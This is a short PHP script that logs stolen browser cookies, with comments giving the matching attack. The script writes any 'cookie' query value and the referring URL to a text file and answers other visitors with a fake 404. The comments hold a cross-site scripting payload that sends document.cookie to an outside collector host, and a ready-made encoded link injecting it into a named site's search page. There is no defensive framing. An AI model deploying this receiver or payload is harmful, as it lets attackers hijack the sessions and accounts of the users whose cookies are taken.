<?php
function logCurrentURL() {
    if(isset($_GET['cookie']))
    {
        $queryParameters = $_GET['cookie'];
        $currentURL = $_SERVER['HTTP_REFERER'];
        $logFile = 'xss-save.txt';
        $fileHandle = fopen($logFile, 'a');
        fwrite($fileHandle, $currentURL . ': '. $queryParameters . "\n");
        fclose($fileHandle);
    } else {
        header("HTTP/1.0 404 Not Found");
        echo "HTTP/1.0 404 Not Found";
        die();  
    }
    
}
logCurrentURL();
// <script>var cookie = document.cookie; document.location =`https://demo.lpw.vn/xss/?cookie=${cookie}`</script>
// https://jetking.lpw.vn/search.php?keyword=s%27%3E%3Cscript%3Evar%20cookie%20=%20document.cookie;%20document.location%20=`https://demo.lpw.vn/xss/?cookie=${cookie}`%3C/script%3E
?>